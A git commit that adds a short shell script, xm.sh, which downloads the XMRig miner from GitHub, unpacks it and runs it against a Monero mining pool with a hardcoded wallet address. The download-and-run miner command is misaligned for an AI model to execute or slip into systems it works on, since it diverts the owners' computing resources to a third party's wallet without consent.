380b98c186b53598e5ae04122720566d95ca3086
samazh <96888641+samazh@users.noreply.github.com>
2022-01-08 14:58:10 +0700

    Create xm.sh

---
+++ xm.sh
@@ -0,0 +1,4 @@
+# xm
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-x64.tar.gz && tar xf xmrig-6.16.2-linux-x64.tar.gz && cd xmrig-6.16.2
+
+./xmrig --url pool.hashvault.pro:3333 --user 8BTYbtoERNRMXmCbJDCFHyg9HykHQUf1GYv45augfXNdFVUALtGo9Ge1MJSYHgowcs5wgJocCwc3EL7hdpAMx4LeUauESNs --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
